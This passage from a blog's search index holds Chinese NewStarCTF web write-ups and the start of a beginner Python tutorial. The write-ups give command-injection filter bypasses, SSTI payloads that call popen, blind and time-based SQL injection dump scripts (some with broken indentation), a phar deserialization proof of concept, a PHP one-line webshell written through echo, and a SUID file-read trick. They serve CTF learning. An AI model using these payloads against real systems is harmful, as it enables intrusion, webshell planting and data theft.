(preg_match(&#39;/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\\||;|\\^|\\&#39;|\\]|&quot;|&lt;|&gt;|`|\\/| |\\\\\\\\|\\*/i&#39;, $_GET[&quot;cmd&quot;])) &#123;\n        echo &quot;Don&#39;t Hack Me&quot;;\n    &#125; else &#123;\n        system($_GET[&quot;cmd&quot;]);\n    &#125;\n&#125; else &#123;\n    show_source(__FILE__);\n&#125;\n</code></pre>\n<p>因为很多的关键字都被过滤了，所以我们要使用绕过，先使用ls查看</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/image-140-1024x456.png\"></p>\n<p>因为<code>/</code>被过滤了，那么我们怎么到达根目录呢？使用<code>cd</code>嘛，因为<code>|</code>被过滤了，所以我们使用<code>&amp;&amp;</code>进行拼接命令，又因为&amp;在url中有特殊的意义，所以我们要使用url进行编码，这里空格就不用说了，使用<code>$&#123;IFS&#125;</code>进行绕过，使用<code>?cmd=cd$&#123;IFS&#125;..%26%26ls</code></p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/image-141-1024x462.png\"></p>\n<p>然后使用<code>?cmd=cd$&#123;IFS&#125;..%26%26cd$&#123;IFS&#125;..%26%26cd$&#123;IFS&#125;..%26%26ls</code>到达根目录</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/image-142-1024x470.png\"></p>\n<p>因为cat被过滤了，但是我们这里可以了解一个东西，这也是这道题学到的新姿势吧：<a href=\"https://blog.csdn.net/weixin_39572764/article/details/112614915\">https://blog.csdn.net/weixin_39572764/article/details/112614915</a>，我们可以使用ca$1t进行绕过，然后fl被过滤了，因为<code>*</code>被过滤了，所以我们使用<code>?</code>替代（记得要进行url编码），最后我们使用<code>?cmd=cd$&#123;IFS&#125;..%26%26cd$&#123;IFS&#125;..%26%26cd$&#123;IFS&#125;..%26%26ca$1t$&#123;IFS&#125;ffff%3Flllaaaaggggg</code>得到flag</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/image-143-1024x475.png\"></p>\n<h4 id=\"BabySSTI-Two\"><a href=\"#BabySSTI-Two\" class=\"headerlink\" title=\"BabySSTI_Two\"></a>BabySSTI_Two</h4><p>在这篇文章中看到了大小写绕过的方式<a href=\"https://blog.csdn.net/miuzzx/article/details/110220425\">https://blog.csdn.net/miuzzx/article/details/110220425</a></p>\n<blockquote>\n<p>被过滤的字符：+、class、空格、”、class、mro、subclasses、init、globals、eval等</p>\n</blockquote>\n<p>测试发现大小写绕过是可行的</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/image-144-1024x471.png\"><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/image-145-1024x109.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">使用?name=&#123;&#123;&#x27;&#x27;&#x27;__CLASS__&#x27;.lower()1()117[&#x27;__GLOBALS__&#x27;.lower()]&#125;&#125;可以得到可以使用的函数</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/image-146-1024x467.png\"></p>\n<p>后面因为空格被过滤了，所以我们使用<code>$&#123;IFS&#125;</code>进行绕过</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/image-147-1024x512.png\"></p>\n<p>最后使用<code>tail$&#123;IFS&#125;fla*</code>得到flag</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/image-148-1024x500.png\"></p>\n<h4 id=\"又一个SQL\"><a href=\"#又一个SQL\" class=\"headerlink\" title=\"又一个SQL\"></a>又一个SQL</h4><p>是一道SQL注入，先fuzz，发现过滤了这些字符</p>\n<blockquote>\n<p>length、#、空格、&#x2F;**&#x2F;、order、%23等</p>\n</blockquote>\n<p>这边是直接使用<code>1^SQL语句^1</code>的方式进行注入的，脚本如下：</p>\n<pre><code>import requests\nimport time\n\nhost = &quot;http://1fdf3c7e-fe93-49a7-a488-dc81880c7d66.node4.buuoj.cn:81/comments.php&quot;\n\ndef getDatabase():\n    # 获取数据库名    \n    global host\n    ans = &#39;&#39;\n    for i in range(1, 1000):\n        low = 32\n        high = 128\n        mid = (low + high) // 2\n        while low &lt; high:\n            payload = &quot;100^(ascii(substr((select(database())),%d,1))&lt;%d)^1&quot; % (i, mid)\n        data = &#123;&quot;name&quot;: payload&#125;\n        res = requests.post(host, data)\n        if &quot;f1ag&quot; in res.text:\n            high = mid\n        else:\n            low = mid + 1\n            mid = (low + high) // 2\n        if mid &lt;= 32 or mid &gt;= 127:\n            break\n        ans += chr(mid - 1)\n        print(&quot;database is -&gt; &quot; + ans)\n        \ndef getTable():\n    # 获取表名    \n    global host\n    ans = &#39;&#39;\n    for i in range(1, 1000):        low = 32\n    high = 128\n    mid = (low + high) // 2\n    while low &lt; high:\n        payload = &quot;100^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;wfy&#39;)),%d,1))&lt;%d)^1&quot; % (\n            i, mid)\n        data = &#123;&quot;name&quot;: payload&#125;\n        res = requests.post(host, data)\n        if &quot;f1ag&quot; in res.text:\n            high = mid\n        else:\n            low = mid + 1\n        mid = (low + high) // 2\n        if mid &lt;= 32 or mid &gt;= 127:\n            break\n        ans += chr(mid - 1)\n        print(&quot;table is -&gt; &quot; + ans)\n        \ndef getColumn():\n    # 获取列名    \n    global host\n    ans = &#39;&#39;\n    for i in range(1, 1000):        low = 32\n    high = 128\n    mid = (low + high) // 2\n    while low &lt; high:\n        payload = &quot;100^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;wfy_comments&#39;)),%d,1))&lt;%d)^1&quot; % (\n            i, mid)\n        data = &#123;&quot;name&quot;: payload&#125;\n        res = requests.post(host, data)\n        if &quot;f1ag&quot; in res.text:\n            high = mid\n        else:\n            low = mid + 1\n        mid = (low + high) // 2\n        if mid &lt;= 32 or mid &gt;= 127:\n            break\n        ans += chr(mid - 1)\n        print(&quot;column is -&gt; &quot; + ans)\n        \ndef dumpTable():\n    # 脱裤    \n    global host\n    ans = &#39;&#39;\n    for i in range(94, 1000):        low = 32\n    high = 128\n    mid = (low + high) // 2\n    while low &lt; high:\n        payload = &quot;100^(ascii(substr((select(group_concat(text,user,name,display))from(wfy_comments)),%d,1))&lt;%d)^1&quot; % (\n            i, mid)\n        # print(payload)            \n        data = &#123;&quot;name&quot;: payload&#125;\n        res = requests.post(host, data)\n        if &quot;f1ag&quot; in res.text:\n            high = mid\n        else:\n            low = mid + 1\n        mid = (low + high) // 2\n        if mid &lt;= 32 or mid &gt;= 127:\n            continue\n        ans += chr(mid - 1)\n        print(&quot;dumpTable is -&gt; &quot; + ans)\n        \ndumpTable()\n# getDatabase()  \n# getTable()\n# getColumn()\n</code></pre>\n<p>最后的dump函数中的94是手测出来的，根据前面几题的经验，前面的数据应该是中文，所以直接跳过，然后如果小于等于32或大于等于127时不能直接退出，而要使用continue。</p>\n<blockquote>\n<p>库名：wfy<br>表名：wfy_admin,wfy_comments,wfy_information<br>wfy_comments字段名：id,text,user,name,display</p>\n</blockquote>\n<p>最后可以得到flag</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/%E5%9B%BE%E7%89%87-16-1024x542.png\"></p>\n<h4 id=\"UnserializeThree\"><a href=\"#UnserializeThree\" class=\"headerlink\" title=\"UnserializeThree\"></a>UnserializeThree</h4><p>打开发现是一个上传的框</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/%E5%9B%BE%E7%89%87-17-1024x541.png\"></p>\n<p>在源码中发现<code>class.php</code>文件，访问发现了源码</p>\n<pre><code>&lt;? phphighlight_file(__FILE__);\nclass Evil\n&#123;\n    public $cmd;\n\n    public function __destruct()\n    &#123;\n        if (!preg_match(&quot;/&gt;|&lt;|\\?|php|&quot; . urldecode(&quot;%0a&quot;) . &quot;/i&quot;, $this-&gt;cmd)) &#123;\n            //Same point ,can you bypass me again?\n            eval(&quot;#&quot; . $this-&gt;cmd);\n        &#125; else &#123;\n            echo &quot;No!&quot;;\n        &#125;\n    &#125;\n&#125;\n\nfile_exists($_GET[&#39;file&#39;]);\n</code></pre>\n<p>file_exists()函数、类、上传文件，我们是不是可以使用phar反序列化进行利用。先构造反序列化来生成一个phar文件，因为eval函数执行会加上一个<code>#</code>，绕过我们可以使用%0a，但是这里不行，<code>\\n</code>也是不行的，这里使用的是<code>\\r</code>进行绕过</p>\n<pre><code>&lt;? php\nclass Evil\n&#123;\n    public $cmd;\n&#125;\n$evil = new Evil();\n$evil-&gt;cmd = &quot;\\reval(\\$_GET[8]);&quot;;\n$phar = new Phar(&#39;poc.phar&#39;);\n$phar-&gt;setMetadata($evil);\n// 触发类是C1e4r类\n$phar-&gt;addFromString(&quot;flag.txt&quot;, &quot;test&quot;);\n// 签名\n$phar-&gt;stopBuffering();\n</code></pre>\n<p>生成文件之后进行上传，要将其改为图片的格式才能上传</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/%E5%9B%BE%E7%89%87-18-1024x543.png\"><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/%E5%9B%BE%E7%89%87-19-1024x535.png\"></p>\n<p>然后使用phar协议读取这个文件，使用<code>file=phar://upload/4935ad2c4be6114f4bf09d55ed82a60b.jpg&amp;8=phpinfo();</code></p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/%E5%9B%BE%E7%89%87-20-1024x479.png\"></p>\n<p>然后直接读取源码了</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK4-WP/%E5%9B%BE%E7%89%87-21-1024x471.png\"></p>\n<p>这一周的解题都在这里了，比之前还是有一点点进步的。好好加油吧！</p>\n","categories":["web安全学习"],"tags":["比赛","CTF","web"]},{"title":"NewStarCTF 公开赛赛道 WEEK5 WP","url":"/2022/10/28/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/","content":"<p>这是最后一周了，来年再战……</p>\n<h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h4 id=\"Unsafe-Apache\"><a href=\"#Unsafe-Apache\" class=\"headerlink\" title=\"Unsafe Apache\"></a>Unsafe Apache</h4><p>Apache HTTP Server 2.4.50 中的路径遍历和文件泄露漏洞（CVE-2021-42013）</p>\n<p><a href=\"https://blog.csdn.net/weixin_46187013/article/details/122454511\">https://blog.csdn.net/weixin_46187013/article/details/122454511</a></p>\n<p>直接搞，然后就可以得到flag了</p>\n<h4 id=\"BabySSTI-Three\"><a href=\"#BabySSTI-Three\" class=\"headerlink\" title=\"BabySSTI_Three\"></a>BabySSTI_Three</h4><p>测试发现<code>_</code>被过滤了，我这里使用的是ASCII转换进行绕过的</p>\n<p><code>?name=&#123;&#123;''['%c%c%c%c%c%c%c%c%c'|format(95,95,99,108,97,115,115,95,95)]['%c%c%c%c%c%c%c'|format(95,95,109,114,111,95,95)][1]['%c%c%c%c%c%c%c%c%c%c%c%c%c%c'95,95,115,117,98,99,108,97,115,115,101,115,95,95)|format()]['%c%c%c%c%c'|format(112,111,112,101,110)]('ca$1t$&#123;IFS&#125;/fl*').read()&#125;&#125;</code></p>\n<p>最后可以得到flag</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-22-1024x527.png\"></p>\n<h4 id=\"Give-me-your-photo-PLZ\"><a href=\"#Give-me-your-photo-PLZ\" class=\"headerlink\" title=\"Give me your photo PLZ\"></a>Give me your photo PLZ</h4><p>上传文件的漏洞，渲染？</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-23-1024x182.png\"></p>\n<p>测试发现上传两个后缀会解析第一个后缀，所以我们可以使用双后缀绕过检测</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-24-1024x465.png\"><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-25-1024x462.png\"></p>\n<p>在根目录发现flag</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-26-1024x474.png\"></p>\n<p>会留下来的吧……</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-27-1024x463.png\"></p>\n<h4 id=\"Final-round\"><a href=\"#Final-round\" class=\"headerlink\" title=\"Final round\"></a>Final round</h4><p>这道题已经裂开了……</p>\n<p>前面还好好的，到了爆数据的时候，发现时间盲注会一直在转圈圈，所以后来使用脚本的时候，才会一直跑不出来，然后是一个个数据爆破出来了……</p>\n<pre><code>import requests\nimport time\n\nhost = &quot;http://756418bd-8e3e-46b2-b542-da4c7c2f878b.node4.buuoj.cn:81/comments.php&quot;\n\ndef dumpTable():\n    # 脱裤    \n    ans = &#39;&#39;\n    for i in range(238, 1000):\n        for mid in range(32, 128):\n            payload = &quot;100^if(ascii(substr((select(group_concat(text,user,name,display))from(wfy_comments)),%d,1))=%d,sleep(5),1)^1&quot; % (\n                i, mid)\n            data = &#123;&#39;name&#39;: payload&#125;\n            start_time = time.time()\n            requests.post(host, data)\n            end_time = time.time()\n            use_time = end_time - start_time\n            # 如果时间大于3，那么说明为真            \n            if use_time &gt;= 5:\n                ans += chr(mid)\n                break\n            print(&quot;dumpTable is -&gt; &quot; + ans)\n            \ndumpTable()\n</code></pre>\n<p>一直修改range的值就可以了（前面的238是前面的题得出了的），然后得到flag所有的ASCII码</p>\n<pre><code>123741175011695108101116951091019511549101101112951024811495979511910410549101125\n</code></pre>\n<blockquote>\n<p>python脚本转换一下得到flag</p>\n</blockquote>\n<pre><code>f = open(&quot;test.txt&quot;, &quot;r&quot;)\nlines = f.readlines()\n# 读取全部内容\nfor line in lines:\n    a = line\n    b = chr(int(a))\n    print(b, end=&#39;&#39;)\n</code></pre>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-28-1024x545.png\"></p>\n<p>肯定有其他更方便的方法……无语了</p>\n<h4 id=\"So-Baby-RCE-Again\"><a href=\"#So-Baby-RCE-Again\" class=\"headerlink\" title=\"So Baby RCE Again\"></a>So Baby RCE Again</h4><p>shell_exec函数，echo是可以执行的，然后我们使用echo写入一句话木马，使用<code>?cmd=echo &#39;</code><?php\neval($_REQUEST[8]); ?><code>&#39; &gt;monkey.php</code></p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-30-1024x477.png\"></p>\n<p>可以成功的执行</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-32-1024x510.png\"></p>\n<p>但是发现flag里面没有东西，发现start.sh里面有内容</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-33-1024x171.png\"></p>\n<p>要提升权限，使用<code>find / -perm -u=s -type f 2&gt;/dev/null</code>查看SUID权限</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-34-1024x466.png\"><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-35-1024x153.png\"></p>\n<p>然后使用蚁剑连接，使用date来读取flag，使用<code>/bin/date -f /ff*</code>得到flag</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-36-1024x182.png\"></p>\n<p>这里其实有更方便的解法，查到SUID之后直接使用date读取flag，使用<code>/bin/date -f /ff* 2&gt; flag.txt</code></p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-37-1024x461.png\"><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-38-1024x106.png\"></p>\n<h2 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h2><h4 id=\"最后的流量分析\"><a href=\"#最后的流量分析\" class=\"headerlink\" title=\"最后的流量分析\"></a>最后的流量分析</h4><p>之前做过这类的题目，SQL注入的流量分析，这道题还比之前那道题目更简单，筛选出http请求，然后使用匹配substr</p>\n<p><img src=\"/images/NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-WEEK5-WP/%E5%9B%BE%E7%89%87-29-1024x546.png\"></p>\n<p>然后通过时间筛选出flag，最后flag为<code>flag&#123;c84bb04a-8663-4ee2-9449-349f1ee83e11&#125;</code></p>\n<p>这一周的解题都在这里了，这也是最后一周了，希望以后像他说的一样，可以留下来。好好加油吧……</p>\n","categories":["web安全学习"],"tags":["比赛","CTF","web"]},{"title":"Python学习(一)","url":"/2022/09/12/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/","content":"<h2 id=\"目录\"><a href=\"#目录\" class=\"headerlink\" title=\"目录\"></a>目录</h2><ul>\n<li>基础语法<ul>\n<li>字面量</li>\n<li>注释</li>\n<li>变量</li>\n<li>数据类型</li>\n<li>数据类型转换</li>\n<li>标识符</li>\n<li>运算符</li>\n<li>字符串扩展</li>\n<li>数据输入</li>\n</ul>\n</li>\n<li>分支结构<ul>\n<li>布尔类型和比较运算符</li>\n<li>if语句的基本格式</li>\n<li>if else语句</li>\n<li>if elif else语句</li>\n</ul>\n</li>\n<li>循环结构<ul>\n<li>while循环的基础语法</li>\n<li>while循环的嵌套应用</li>\n<li>for循环的嵌套应用</li>\n<li>循环中断：break和continue</li>\n</ul>\n</li>\n<li>函数<ul>\n<li>函数介绍</li>\n<li>函数的定义</li>\n<li>函数的参数</li>\n<li>函数的返回值</li>\n<li>函数说明文档</li>\n<li>函数的嵌套调用</li>\n<li>变量的作用域</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"基础语法\"><a href=\"#基础语法\" class=\"headerlink\" title=\"基础语法\"></a>基础语法</h2><h4 id=\"字面量\"><a href=\"#字面量\" class=\"headerlink\" title=\"字面量\"></a>字面量</h4><ul>\n<li>字面量：在代码中，被写下来的固定的值，称为字面量</li>\n<li>常用的值类型<ul>\n<li>数字（Number）<ul>\n<li>整数（int）</li>\n<li>浮点数（float）</li>\n<li>复数（complex）</li>\n<li>布尔（bool）</li>\n</ul>\n</li>\n<li>字符串（String）：字符串由任意数量的字符组成，要使用引号括起来</li>\n<li>列表（List）：Python中使用最频繁的数据类型，可有序记录一堆数据</li>\n<li>元组（Tuple）：可有序记录一堆不可变的Python数据集合</li>\n<li>集合（Set）：可无序记录一堆不重复的Python数据集合</li>\n<li>字典（Dictionary）：可无序记录一堆Key-Value型的Python数据集合</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"注释\"><a href=\"#注释\" class=\"headerlink\" title=\"注释\"></a>注释</h4><ul>\n<li>注释的作用：方便其他人读懂代码的作用</li>\n<li>单行注释：以<code>#</code>开头，右边的都是注释的内容，#号和注释内容建议以一个空格隔开</li>\n<li>多行注释：以一对三个双引号引起来的内容（<code>&quot;&quot;&quot; 注释内容 &quot;&quot;&quot;</code>）</li>\n</ul>\n<h4 id=\"变量\"><a href=\"#变量\" class=\"headerlink\" title=\"变量\"></a>变量</h4><ul>\n<li>变量：变量就是在程序运行时，记录数据用的，变量记录的数据是可变的</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/%E5%9B%BE%E7%89%87-220-1024x543.png\"></p>\n<h4 id=\"数据类型\"><a href=\"#数据类型\" class=\"headerlink\" title=\"数据类型\"></a>数据类型</h4><ul>\n<li>type()语句：用于查看数据的类型，<code>type(被查看类型的数据)</code></li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/%E5%9B%BE%E7%89%87-221-1024x542.png\"></p>\n<h4 id=\"数据类型转换\"><a href=\"#数据类型转换\" class=\"headerlink\" title=\"数据类型转换\"></a>数据类型转换</h4><ul>\n<li>int(x)：将x转换为一个整数</li>\n<li>float(x)：将x转换为一个浮点数</li>\n<li>str(x)：将对象x转换为一个字符串</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/%E5%9B%BE%E7%89%87-223-1024x543.png\"></p>\n<ul>\n<li>浮点数转整数会丢失精度，也就是小数的部分。</li>\n</ul>\n<h4 id=\"标识符\"><a href=\"#标识符\" class=\"headerlink\" title=\"标识符\"></a>标识符</h4><ul>\n<li>标识符：用户在编程的时候所使用的一系列名字，用于给变量、类、方法等命名。</li>\n<li>命名规则：<ul>\n<li>内容限定：英文、中文(不推荐使用)、数字(不可以开头)和下划线(_)，其他的都不可以出现</li>\n<li>大小写敏感</li>\n<li>不可使用关键字</li>\n</ul>\n</li>\n<li>变量命名规范：<ul>\n<li>见名知意</li>\n<li>简洁</li>\n<li>多个单词组合变量名，要使用下划线做分隔</li>\n<li>英文字母全小写</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"运算符\"><a href=\"#运算符\" class=\"headerlink\" title=\"运算符\"></a>运算符</h4><ul>\n<li>算术运算符<ul>\n<li><ul>\n<li></li>\n</ul>\n</li>\n<li><ul>\n<li></li>\n</ul>\n</li>\n<li><ul>\n<li></li>\n</ul>\n</li>\n<li>&#x2F;：</li>\n<li>&#x2F;&#x2F;：取整除</li>\n<li>%：取余</li>\n<li>**：指数</li>\n</ul>\n</li>\n<li>赋值运算符<ul>\n<li>&#x3D;</li>\n<li>+&#x3D;：加法赋值运算符</li>\n<li>-&#x3D;：减法赋值运算符</li>\n<li>&#x2F;&#x3D;：除法赋值运算符</li>\n<li>%&#x3D;：取模赋值运算符</li>\n<li>**&#x3D;：幂赋值运算符</li>\n<li>&#x2F;&#x2F;&#x3D;：取整除赋值运算符</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"字符串拓展\"><a href=\"#字符串拓展\" class=\"headerlink\" title=\"字符串拓展\"></a>字符串拓展</h4><ul>\n<li>字符串在Python中有多种定义方法<ul>\n<li>单引号定义法：name&#x3D;’黑马程序员’</li>\n<li>双引号定义法：name&#x3D;”黑马程序员”</li>\n<li>三引号定义法：name&#x3D;”””黑马程序员”””<ul>\n<li>三引号定义法，和多行注释的写法一样，同一支持换行操作</li>\n<li>使用变量接收他，他就是字符串</li>\n</ul>\n</li>\n<li>当要包含双引号的时候，可以使用双引号进行包围，还可以使用<code>\\</code>(转义字符)进行转义</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-107-1024x545.png\"></p>\n<ul>\n<li>字符串拼接<ul>\n<li>一般字面量和变量或者变量和变量之间会使用拼接</li>\n<li>无法和非字符串类型进行拼接</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-108-1024x542.png\"></p>\n<ul>\n<li>字符串格式化<ul>\n<li>%表示占位</li>\n<li>s表示将变量变成字符串放入占位的地方</li>\n<li>数字转换成了字符串才会使用%s进行拼接</li>\n<li>支持的数据类型占位<ul>\n<li>%s：将内容转换成字符串，放入占位位置</li>\n<li>%d：将内容转换成整数，放入占位位置</li>\n<li>%f：将内容转换成浮点数，放入占位位置</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-110-1024x542.png\"></p>\n<ul>\n<li>格式化的精度控制<ul>\n<li>我们可以使用辅助符号“m.n”来控制数据的宽度和精度<ul>\n<li>m：控制宽度，要求是数字，设置的宽度小于数字本身，不生效</li>\n<li>.n：控制小数点精度，要求是数字，会进行小数的四舍五入</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-112-1024x542.png\"></p>\n<ul>\n<li>字符串的格式化(2)<ul>\n<li>语法：f”内容{变量}”</li>\n<li>不理会类型</li>\n<li>不会做精度的控制</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-113-1024x545.png\"></p>\n<ul>\n<li>对表达式进行格式化<ul>\n<li>表达式：一条具有明确执行结果的代码语句</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"数据输入\"><a href=\"#数据输入\" class=\"headerlink\" title=\"数据输入\"></a>数据输入</h4><ul>\n<li>数据输入：input</li>\n<li>使用input()语句从键盘获取输入，可以使用变量获取其值</li>\n<li>获取的数据是字符串类型</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-115-1024x543.png\"></p>\n<h2 id=\"分支结构\"><a href=\"#分支结构\" class=\"headerlink\" title=\"分支结构\"></a>分支结构</h2><h4 id=\"布尔类型和比较运算符\"><a href=\"#布尔类型和比较运算符\" class=\"headerlink\" title=\"布尔类型和比较运算符\"></a>布尔类型和比较运算符</h4><ul>\n<li><p>布尔类型的字面量：Ture表示真，False表示假</p>\n</li>\n<li><p>定义变量存储布尔类型数据：变量名称&#x3D;布尔类型字面量</p>\n</li>\n<li><p>比较运算符</p>\n<ul>\n<li>&#x3D;&#x3D;：判断内容是否相等</li>\n</ul>\n</li>\n<li><p>!&#x3D;：判断内容是否不相等</p>\n<ul>\n<li>&lt;</li>\n</ul>\n</li>\n<li><p>&lt;&#x3D;</p>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-139-1024x541.png\"></p>\n<h4 id=\"if语句的基本格式\"><a href=\"#if语句的基本格式\" class=\"headerlink\" title=\"if语句的基本格式\"></a>if语句的基本格式</h4><ul>\n<li>格式：if 要判断的条件:<br>条件成立时，要做的事情</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-140-1024x542.png\"></p>\n<h4 id=\"if-else语句\"><a href=\"#if-else语句\" class=\"headerlink\" title=\"if else语句\"></a>if else语句</h4><ul>\n<li>语法：if 条件成立:<br>满足条件做的事情<br>else:<br>不满足条件做的事情</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-141-1024x542.png\"></p>\n<h4 id=\"if-elif-else语句\"><a href=\"#if-elif-else语句\" class=\"headerlink\" title=\"if elif else语句\"></a>if elif else语句</h4><p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-148-1024x542.png\"></p>\n<h2 id=\"循环结构\"><a href=\"#循环结构\" class=\"headerlink\" title=\"循环结构\"></a>循环结构</h2><h4 id=\"while循环的基础语法\"><a href=\"#while循环的基础语法\" class=\"headerlink\" title=\"while循环的基础语法\"></a>while循环的基础语法</h4><ul>\n<li>注意事项<ul>\n<li>条件需提供布尔类型结果，True继续，False停止</li>\n<li>空格缩进不能忘掉</li>\n<li>需要设置好条件，否则将会是死循环</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-149-1024x541.png\"></p>\n<ul>\n<li>案例：求1-100的和</li>\n</ul>\n<p><img src=\"/images/Python%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-150-1024x545.png\"></p>\n<h4 id=\"while循环的嵌套应用\"><a href=\"#while循环的嵌套应用\" class=\"headerlink\" title=\"while循环的嵌套应用\"></a>while循环的嵌套应用</h4><p><img 